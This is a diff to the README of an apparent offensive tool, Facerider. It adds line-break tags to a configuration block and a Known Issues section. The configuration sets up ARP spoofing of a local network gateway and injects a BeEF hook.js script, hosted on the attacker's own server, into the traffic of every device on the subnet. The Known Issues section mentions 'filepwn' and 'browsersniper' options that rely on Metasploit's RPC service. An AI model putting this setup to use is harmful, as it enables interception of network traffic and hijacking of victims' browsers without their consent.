@@ -34,12 +34,17 @@ Assuming you are using a wireless card and you have wireless connected your Neth
 ![](https://raw.githubusercontent.com/tanc7/Facerider/master/fr-beef-hook.png)
 
 <code>
-set INTERFACE = wlan0
-set INJECT = 1
-set JS_URL = http://yourvpsipaddress:3000/hook.js
-set SPOOF = 1
-set SPOOF_TYPE = 1
-set SPOOF_GATEWAY = The gateway you found with the route -n command // Alternatively  you can use the IPTools app on the Google Play Store to find your local router's IP but it's been shoddy.
+<br>set INTERFACE = wlan0
+<br>set INJECT = 1
+<br>set JS_URL = http://yourvpsipaddress:3000/hook.js
+<br>set SPOOF = 1
+<br>set SPOOF_TYPE = 1
+<br>set SPOOF_GATEWAY = The gateway you found with the route -n command // Alternatively  you can use the IPTools app on the Google Play Store to find your local router's IP but it's been shoddy.
 </code>
 
 SPOOF_TARGET can be left commented out if you wish to attack the entire subnet.
+
+# Known Issues
+
+Running the --filepwn and --browsersniper options throws an error from the mitmf app. It is unable to connect to the msfrpcd service no matter how hard I try. This partly has to do with the changes that Rapid7 added to their msfrpc daemon and the fact that mitmf has been a abandoned project since 2015. I am still WORKING on resolving this.
+
